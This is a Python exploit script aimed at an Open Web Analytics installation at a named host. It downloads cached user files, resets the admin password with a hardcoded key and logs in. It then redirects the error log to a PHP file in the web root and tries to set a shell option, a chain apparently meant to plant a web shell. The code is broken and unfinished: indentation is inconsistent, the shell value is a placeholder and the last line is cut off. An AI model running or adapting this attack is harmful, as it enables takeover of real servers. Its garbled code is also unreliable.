import string
import hashlib
import requests
import os
import base64
import json
import re

os.chdir('/sdcard')

for key in range(100):
  
  base_url='https://owa.communovation.com/'
  user_id = 'user_id' + str(key)
  userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
  filename = userid_hash + '.php'
  filename = userid_hash + '.php'
  cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
  cache = requests.get(cache_url)
  v = str(cache.status_code)
  if v == '200':
  	vx = str(cache.text)
  	sd = vx.replace('*' , '  *')
  	yum = sd.replace('*' ,'')
  	varane = yum.split()
  	#hash
  	
  	
  	login = base_url + "index.php?owa_do=base.loginForm"
  	
  	password= base_url + "index.php?owa_do=base.usersPasswordEntry"
  	
  	config= base_url + "index.php?owa_do=base.optionsGeneral"
  	
  	data2 = {
      "owa_user_id": 'admin',
      "owa_password": 'jon',
      "owa_action": "base.login"
   }
  	
  	
  	data1 = {
      "owa_password": 'jon',
      "owa_password2": 'jon',
      "owa_k": 'e2b0d13782e45fbe8c2fd028e661fc37',
      "owa_action": 
      "base.usersChangePassword"
   }
   
  	
  	 
  	
  	
   

  	req1 = requests.post(password, data=data1)
  	session= requests.Session()
  	req2 = session.post(login, data=data2)
  	cookie = session.cookies.get_dict()
  	
  	log_location = "/var/www/html/owa/owa-data/caches/" + 'jo.php'
   data3 = {
      "owa_nonce": 'ebf17b9629', 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
   sam = requests.post(config, data=data3, cookies=cookie)
   
   reverse = 'jon'
   
   
     data = {
      "owa_nonce": 'ebf17b9629',
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": reverse
   }
   
   
   sad = req
   
  
  	
  	
  	